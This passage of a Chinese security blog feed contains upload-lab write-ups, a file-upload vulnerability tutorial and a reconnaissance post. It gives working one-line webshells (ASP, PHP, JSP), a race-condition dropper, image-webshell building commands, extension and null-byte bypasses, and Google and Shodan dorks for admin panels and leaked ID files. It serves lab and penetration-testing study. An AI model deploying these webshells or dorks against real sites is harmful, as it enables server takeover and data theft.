null;</span><br><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上最后一关和上传关系不大，这个题主要考查 PHP 代码审计，关于代码审计的题目实际上 XDebug 动态调试一下就可以很轻松的做出来，关于 XDebug 的配置文章可以参考国光我之前写的两篇文章：</p><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光 - macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/09/xdebug.html">国光 - Xdebug + 宝塔 + PHPStudy+VScode PHP</a></li></ul><p>首先看第一个判断：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP$allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line"></span><br><span class="line">if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">  echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p><p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code> 为分隔，打散为数组：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line"></span><br><span class="line">if (!is_array($file)) &#123;</span><br><span class="line">  $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p><p>因为打散后会校验最后的后缀：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP$ext = end($file);</span><br><span class="line">$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line"></span><br><span class="line">if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">  echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">$file = [0=&gt;&#x27;shell.php/&#x27;, 2=&gt;&#x27;png&#x27;]</span><br></pre></td></tr></table></figure><p>这样执行完最后的拼接文件名的代码后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">$file_name = &#x27;shell.php/&#x27; . &#x27;.&#x27; . $file[2 - 1]; = &#x27;shell.php/&#x27;.&#x27;&#x27; = &#x27;shell.php/.&#x27;</span><br></pre></td></tr></table></figure><p>这样最后一步：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHPmove_uploaded_file($temp_file, $img_path)</span><br><span class="line">move_uploaded_file($temp_file, &#x27;xx/xx/shell/php/.&#x27;)  </span><br></pre></td></tr></table></figure><p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p><p>那么最终构造的数据包如下：</p><p><img src="https://image.3001.net/images/20201026/16036832903333.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 密码爆破 </tag>
            
            <tag> 题目详解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/posts/undefined/sec2/"/>
      <url>/posts/undefined/sec2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如<strong>企业的OA系统，允许用户上传图片、视频、头像和许多其他类D的文件</strong>。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以<strong>利用文件上传漏洞将可执行脚本程序(WebShell)上传到服务器中，获得网站的权限</strong>，然后可以<strong>进一步对服务器进行入侵</strong>，扩大控制权限。</p><h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><p>上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以<strong>上传任意文件</strong>的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>非法用户可以利用<strong>上传的恶意脚本文件控制整个网站，甚至控制服务器</strong>。这个恶意的脚本文件，又被称为<strong>WebShell</strong>，也可将<strong>WebShell脚本称为一种网页后门</strong>, WebShell脚本具有非常强大的<strong>功能</strong>，比如<strong>查看服务器目录、服务器中的文件，执行系统命令</strong>等。<br>WebShell 就是以ASP、PHP、JSP等网页脚本存在的一种命令执行环节，通常也叫做<strong>网页后门</strong>。攻击者在<strong>入侵了一个网站后</strong>，通常<strong>会将WebShell上传到网站的根目录下或者插入到正常的网页中</strong>，然后<strong>使用浏览器或者对应的WebShell客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。</strong></p><h2 id="不同类型漏洞代码"><a href="#不同类型漏洞代码" class="headerlink" title="不同类型漏洞代码"></a>不同类型漏洞代码</h2><ul><li><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt;</span><br></pre></td></tr></table></figure></li><li><p>ASPX</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item [&quot;x&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;x&#x27;])?&gt;</span><br><span class="line">&lt;?php assert($_POST[&#x27;x&#x27;])；?&gt;</span><br></pre></td></tr></table></figure></li><li><p>JSP CMD WebShell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">&#123;</span><br><span class="line">java.io.InputStream in=Runtime,getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp inta=-1;</span><br><span class="line">byte[]b=new byte[2048];</span><br><span class="line">out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">while((a=in.read(b))！=-1)</span><br><span class="line">&#123;</span><br><span class="line">out.println(new String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(&quot;&lt;/pre&gt;&quot;)；</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="上传漏洞攻击满足的条件"><a href="#上传漏洞攻击满足的条件" class="headerlink" title="上传漏洞攻击满足的条件"></a>上传漏洞攻击满足的条件</h2><ol><li>上传的文件<strong>能够被Web容器解释执行</strong>。所以文件上传后<strong>所在的目录要是Web容器所覆盖到的路径</strong>。</li><li>用户能够<strong>从 Web上访问这个文件</strong>。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞。</li><li>查看上传的文件是否被<strong>安全检查、格式化、图片压缩</strong>，改变了内容，则也可能导致攻击不成功。</li></ol><h2 id="中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件上传题目"><a href="#文件上传题目" class="headerlink" title="文件上传题目"></a>文件上传题目</h2><h3 id="1-JS-永远不要相信用户的输入"><a href="#1-JS-永远不要相信用户的输入" class="headerlink" title="1. JS - 永远不要相信用户的输入"></a>1. JS - 永远不要相信用户的输入</h3><p>“永远不要相信用户的输入”是进行安全设计和安全编码的重要准则。换句话说，任何输入数据在证明其无害之前，都是有害的。许多危险的漏洞就是因为过于相信用户的输入是善意的而导致的。</p><ol><li>禁用JS</li><li><strong>BP改包</strong></li><li>JS调试</li><li>使用 BP 修改返回包内容</li></ol><h3 id="2-解析规则-Apache-中-htaccess"><a href="#2-解析规则-Apache-中-htaccess" class="headerlink" title="2.解析规则 - Apache 中 .htaccess"></a>2.解析规则 - Apache 中 .htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><ul><li>White白名单：只允许某些类型的文件上传</li><li>Blacklist黑名单列表：不允许某些类型文件上传</li><li><strong>把png当做木马解析  然后就能解析到图</strong>片</li><li><strong>设置解析规则命令</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/ x-httpd-php .png</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-MIME-媒体类型"><a href="#3-MIME-媒体类型" class="headerlink" title="3.MIME - 媒体类型"></a>3.MIME - 媒体类型</h3><p>媒体类型（通常称为MultipurposeInternetMalExtensions 或MNE类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</p><ul><li>MNE的组成结构非常简单﹔由类型与子类型两个字符串中间用′分隔而组成。不允许空格存在。type表示可以被分多个子类的独立类别。subtype表示细分后的每个类型。</li><li>通用结构:type&#x2F;subtype</li><li><strong>方法：修改图片类型，或者修改后缀</strong></li></ul><h3 id="4-文件头-文件头绕过"><a href="#4-文件头-文件头绕过" class="headerlink" title="4.文件头 - 文件头绕过"></a>4.文件头 - 文件头绕过</h3><p>一个文件里面的内容到底是啥?用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</p><table><thead><tr><th>文件名</th><th></th><th>文件头(16进制)</th></tr></thead><tbody><tr><td>JPEG</td><td>ipg</td><td>FFD8FF</td></tr><tr><td>PNG</td><td>png</td><td>89504E47</td></tr><tr><td>GIF</td><td>gif</td><td>47494638</td></tr><tr><td>HTML</td><td>html</td><td>68746D6C3E</td></tr><tr><td>ZIP Archive</td><td>zip</td><td>504B0304</td></tr><tr><td>RAR Archive</td><td>rar</td><td>52617221</td></tr><tr><td>Adobe Acrobat</td><td>pdf</td><td>255044462D312E</td></tr><tr><td>MS Word&#x2F;Exce</td><td>xls.ordod</td><td>DOCF11E0</td></tr></tbody></table><ul><li><strong>方法：生成图片木马</strong></li><li><ol><li>png + php 合成png图马</li></ol></li><li>copy 1.png + 2.php&#x2F;a 3.png</li><li><ol start="2"><li>将shell.php内容追加到pic.php<br>cat shell.php &gt;&gt; pic.png</li></ol></li><li><ol start="3"><li>直接echo追加<br>echo ‘<?php phpinfo();?>‘ &gt;&gt; pic.png</li></ol></li></ul><h3 id="5-缺陷代码-1"><a href="#5-缺陷代码-1" class="headerlink" title="5.缺陷代码 - 1"></a>5.缺陷代码 - 1</h3><p>网络安全永远处于一个发展更新的状态。因为漏洞是依赖于产品的，产品更新换代，漏洞也会更新换代。而且安全，实际上它是一个博弈的过程，永远有更强的聪明小伙想要制造点新麻烦。如果要是想一劳永逸的话，这个行业可能并不适合。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$blacklist = array(&quot;php&quot;，&quot;php5&quot;，&quot;php4&quot;,“&quot;php3&quot;，&quot;phtml&quot;,&quot;pht&quot;，&quot;htaccess&quot;);</span><br><span class="line">$name = str_ireplace($blacklist，&quot;&quot;，$nalie ) ;</span><br><span class="line">if (move_uploaded_file($_FILES[ &#x27;file&#x27;][ &#x27; tmp_name &#x27; ]，UPLOAD_PATH . $name ))</span><br></pre></td></tr></table></figure><p><strong>题目会将名单中的格式替换为空 格式不区分大小写</strong></p><ul><li><strong>方法</strong>：shell.php - &gt; shell.pphphp</li></ul><h3 id="6-缺陷代码-2"><a href="#6-缺陷代码-2" class="headerlink" title="6.缺陷代码 - 2"></a>6.缺陷代码 - 2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$blacklist = array(&quot;php&quot;，&quot;php5&quot;，&quot;php4&quot;,“&quot;php3&quot;，&quot;phtml&quot;,&quot;pht&quot;，&quot;htaccess&quot;);</span><br><span class="line">$name = str_ireplace($blacklist，&quot;&quot;，$nalie ) ;</span><br><span class="line">if (move_uploaded_file($_FILES[ &#x27;file&#x27;][ &#x27; tmp_name &#x27; ]，UPLOAD_PATH . $name ))</span><br></pre></td></tr></table></figure><p><strong>题目会将名单中的格式替换为空格  格式区分大小写</strong></p><ul><li><strong>方法</strong> ：改变格式大小写</li></ul><h3 id="7-GET-型-00-截断"><a href="#7-GET-型-00-截断" class="headerlink" title="7.GET 型 00 截断"></a>7.GET 型 00 截断</h3><p>PHP内核是由C语言实现的，所以使用了C语言中的一些字符串处理函数。比如在连接字符串时候，0字节（\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串</p><ul><li>这种方法只适用于<br> magicquotes-gpc &#x3D; Off<br> PHP版本小于5.3.4</li><li><strong>题目会将上传的文件重命名保存</strong></li><li><strong>方法</strong>：用BP截断后添加 X.png%00 进行截断上传</li></ul><h3 id="8-POST-型-00-截断"><a href="#8-POST-型-00-截断" class="headerlink" title="8.POST 型 00 截断"></a>8.POST 型 00 截断</h3><p>需要手动解码</p><ul><li><strong>方法</strong>：添加X.php%00后选中 %00 进行转码选择转成url</li><li>或者输入空格十六进制进制改为00</li></ul><h3 id="9-黑名单缺陷"><a href="#9-黑名单缺陷" class="headerlink" title="9.黑名单缺陷"></a>9.黑名单缺陷</h3><p>白名单是设置能通过的用户，白名单以外的用户都不能通过。黑名单是设置不能通过的用户，黑名单以外的用户都能通过。所以—般情况下白名单比黑名单限制的用户要更多—些</p><ul><li><strong>方法</strong>：BP拦截修改后缀名再放包</li></ul><h3 id="10-条件竞争"><a href="#10-条件竞争" class="headerlink" title="10.条件竞争."></a>10.条件竞争.</h3><p><strong>事件的先后顺序不会影响一个系统的运行结</strong>果。当这些不受控制的事件并<strong>没有按照开发者想要的方式运行</strong>时，就可能会出现bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件<strong>竞争漏洞</strong>。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell 文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小Webshell，落红不是无情物，化作春泥更护花（泪目）。这类的webshell内容大体上如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><ul><li>不允许直接上传</li><li>先上传再判断然后操作</li><li>CPU - &gt; 时间差</li><li>条件竞争 - &gt; 短时间内多线程大量请求(上传)</li><li><strong>母马-&gt;解析-&gt;释放子马</strong></li><li><ol><li>挑选天选之马(木马)  访问时会将母马写入xaio.php<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><ol start="2"><li>需要条件竞争大量快速上传木马到服务器<br>如果不够快 母马就会被 kill 掉</li></ol></li><li><ol start="3"><li>母马需要被解析(条件竞争访问)<br>如果木马上传成功 但是没有访问就不会触发解析 不解析就没有任何作用</li></ol></li><li><ol start="4"><li>访问母马释放出来的子马即可 getshell</li></ol></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure><ol><li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li><li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者<strong>IDAT 数据块</strong></li><li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</li></ol><ul><li><p>渲染两次会返回正确木马</p></li><li><p>JPG坑点总结</p></li><li><ol><li>需要被imagecreatefromjpeg渲染或再用工具</li></ol></li><li><ol start="2"><li>图片找的稍微大一点成功率更高</li></ol></li><li><ol start="3"><li>Payload语句越短成功率越高</li></ol></li><li><ol start="4"><li>一张图片不行就换一张不要死磕</li></ol></li><li><ol start="5"><li>国光补充:貌似白色的图片成功率也比较高</li></ol></li><li><ol start="6"><li><?php $_GET[0]($_POST[1]);?> 这种payload成功率很高</li></ol></li></ul><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/posts/undefined/sec1/"/>
      <url>/posts/undefined/sec1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>渗透测试(Penetration Testing)是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法。</p><h2 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h2><p>信息收集是渗透测试的第一阶段。在这个阶段，渗透人员需要使用各种方法尽可能地获取到目标资产的相关信息。渗透测试人员可以使用诸如百度或者谷歌这类的传统式搜索引擎来收集信息，也可以借助如<strong>Shodan、Zoomeye</strong>或者<strong>FQFA</strong>这类的物联网搜索引擎，甚至还可以直接使用本地的工具对目标资产进行<strong>操作系统探测、端口扫描、Webr目录扫描、Web指纹识别</strong>等。收集的信息越多，渗透测试成功的概率越高，所以业内常流传着这样一句话“<strong>渗透测试的本质就是信息收集</strong>”。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>信息收集的方式可以分为两种:<strong>主动</strong>和<strong>被动</strong>。</p><ol><li>主动:通过直接访问、扫描网站，这种将流量流经网站的行为。（缺点  会留下痕迹）</li><li>被动:利用第三方暴露在外，主要是互联网的信息进行收集。</li></ol><h3 id="常规收集"><a href="#常规收集" class="headerlink" title="常规收集"></a>常规收集</h3><ul><li><strong>备份文件泄露</strong><br><strong>通过对目录扫描</strong><br>备份文件与缓存文件泄露</li><li><strong>robots.txt泄露</strong></li></ul><h3 id="从信息泄密到未授权访问"><a href="#从信息泄密到未授权访问" class="headerlink" title="从信息泄密到未授权访问"></a>从信息泄密到未授权访问</h3><ul><li><strong>端口扫描与目录扫描</strong><br>开放某些敏感端口，通过burp爆破，遍历搜寻到网站敏感文件</li></ul><h3 id="内网收集"><a href="#内网收集" class="headerlink" title="内网收集"></a>内网收集</h3><ul><li><strong>内网服务器邮箱记录</strong></li><li><strong>浏览器保存密码记录</strong><br>将密码的表单（<strong>密码的类型type</strong>）破坏掉会看到正常的密码显示</li><li><strong>ESXI认证</strong><br>运维管理员登录</li><li><strong>hosts,bash_history等</strong><br>Linux中历史命令记录 ~&#x2F;.bash_history</li></ul><hr><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此Google Hack能<strong>在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集,并且尽可能的获得更多的信息</strong></p><ul><li><strong>谷歌语法</strong></li></ul><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>强制包含某个字符进行查询</td></tr><tr><td>-</td><td><strong>查询的时候忽略某个字符</strong></td></tr><tr><td>“”</td><td>精确匹配双引号内的字符</td></tr><tr><td>*</td><td>匹配任意字符进行查询</td></tr><tr><td>site：</td><td><strong>指定域名</strong></td></tr><tr><td>intext</td><td>正文中存在关键词的网页</td></tr><tr><td>intitle</td><td><strong>标题中存在关键词的网页</strong></td></tr><tr><td>inurl</td><td>URL中存在关键词的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table><ul><li>寻找后台<br>intitle:后台登录<br>inurl:login |admin|manage |member|admin_login|login_admin|system &#x2F;login|user|main | cmsinutl: houtai.php | houtai.asp<br>intext:管理|后台|登陆|用户名|密码|系统|帐号</li><li>查找文件上传点<br>inurl:admin&#x2F;upfile.asp<br>inurl:admin&#x2F;upload.asp<br>inurl:Richwidgets&#x2F;Popup_Upload.aspx</li><li>查找目录遍历站点<br>intitle : “index of”</li><li>寻找存在注入的PHP站点 （SQL注入）<br>inurl: “.php?id&#x3D;” “You have an error in your SQL syntax”</li><li>寻找互联网上的登录口<br>intitle:登录</li><li>寻找网站后台<br>intitle:后台登录<br>inurl:login|admin|manage&#x2F;memberladmin_login|login_admin |system &#x2F;login |user[main | cmsinutl: houtai.php | houtai.asp<br>inurl:login|admin|manage&#x2F;memberladmin_login|login_admin |system &#x2F;login |user[main | cmsinutl: houtai.php | houtai.asp</li></ul><h2 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h2><p>谷歌黑客漏洞<a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a></p><hr><ul><li>找互联网上带有身份证号的敏感文件<br>泄密：<strong>filetype指定搜索类型</strong> xls xlsx pdf doc docx<br>身份证 filetype:xlsx  &#x2F;  filetype:xlsx 服务器密码</li><li>搜索百度公司相关的登录口</li><li>寻找有漏洞的PHPMyAdmin<br>inurl:&#x2F;phpmyadmin&#x2F;index.php 2.11.9.2</li></ul><hr><h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><p>物联网搜索引擎也叫网络空间搜索引擎，是对全球网络空间基础设施或网络设备进行扫描，并可以对指纹特征检索的平台。</p><h3 id="Shodan-https-shodan-io"><a href="#Shodan-https-shodan-io" class="headerlink" title="[Shodan] (https://shodan.io/)"></a>[Shodan] (<a href="https://shodan.io/">https://shodan.io/</a>)</h3><ul><li>基本语法</li></ul><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>net</td><td>搜索指定ip地址或者子网，c段</td></tr><tr><td>hostname</td><td>搜索指定的域名或者服务器</td></tr><tr><td>port</td><td>搜索开放指定端口的设备</td></tr><tr><td>org</td><td>搜索属于指定组织或者公司的设备</td></tr><tr><td>product</td><td>搜索运行指定产品或者软件操作系统的设备</td></tr><tr><td>version</td><td>指定软件的版本</td></tr><tr><td>isp</td><td>搜索指定isp供应商的设备</td></tr><tr><td>country</td><td>搜索指定国家的设备</td></tr><tr><td>city</td><td>搜索指定城市的设备</td></tr></tbody></table><ul><li>应用实例</li></ul><ol><li>查找位于国内的Nginx服务器<br>nginx country:cn</li><li>搜索位南京开启3389端口的服务器<br>port: 3389 city:nanjing</li><li>搜索海康威视摄像头<br>Hikvision-webs country:cn city:nanjing</li><li>查看Cisco思科设备全球分布<br>isp:cisco<br>isp:cisco country:cn</li><li>查看华为设备全球分布<br>isp: huawei</li></ol><ul><li>JAWS摄像头</li><li>JAWS&#x2F;1.0</li></ul><h3 id="Zoomeye-https-zoomeye-org"><a href="#Zoomeye-https-zoomeye-org" class="headerlink" title="[Zoomeye] (https://zoomeye.org/)"></a>[Zoomeye] (<a href="https://zoomeye.org/">https://zoomeye.org/</a>)</h3><h3 id="Fofa-https-fofa-so"><a href="#Fofa-https-fofa-so" class="headerlink" title="[Fofa] (https://fofa.so/)"></a>[Fofa] (<a href="https://fofa.so/">https://fofa.so/</a>)</h3><hr><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。例如通过某公司官网的主域名，可以暴力破解出该公司内部系统〈如OA、CRM等等）的访问地址。</p><ul><li>搜索引擎   (<strong>谷歌语法</strong>)<br> site: domain</li><li><a href="https://phpinfo.me/domain/">在线子域名查询</a></li><li><a href="https://crt.sh/">证书反查</a></li><li><strong>软件爆破</strong></li><li><ol><li>冷门子域名难以发现</li></ol></li><li><ol start="2"><li>2，,4，5,6级域名越来越多 ，爆破难度指数增加</li></ol></li></ul><hr><h2 id="C段与旁站"><a href="#C段与旁站" class="headerlink" title="C段与旁站"></a>C段与<strong>旁站</strong></h2><ul><li>C段也称为C类IP地址，<strong>外网渗透一般到C段</strong></li><li>C段默认子网掩码 255.255.255.0 覆盖ip地址较少</li><li>B类 255.255.0.0 ，A类 255.0.0.0</li></ul><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><ul><li><strong>Fofa语法</strong>：ip”111.111.111.1&#x2F;24” &amp;&amp; type&#x3D;”subdomain”</li><li><strong>kali</strong>：nmap -p 80,8080 111.111.111.1&#x2F;24</li><li><strong>serversan</strong>：在kali中使用较为方便 ，github上有开源</li></ul><h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><ul><li>DNS：提高解析速度，提高访问速度<br>114.114.114.114 中国通用<br>8.8.8.8 美国谷歌</li><li><strong>nslookup</strong> <a href="http://www.baidu.com/">www.baidu.com</a><br>解析网站信息</li><li><strong>ping</strong> 测试<br>发包测试网络连通性<br><a 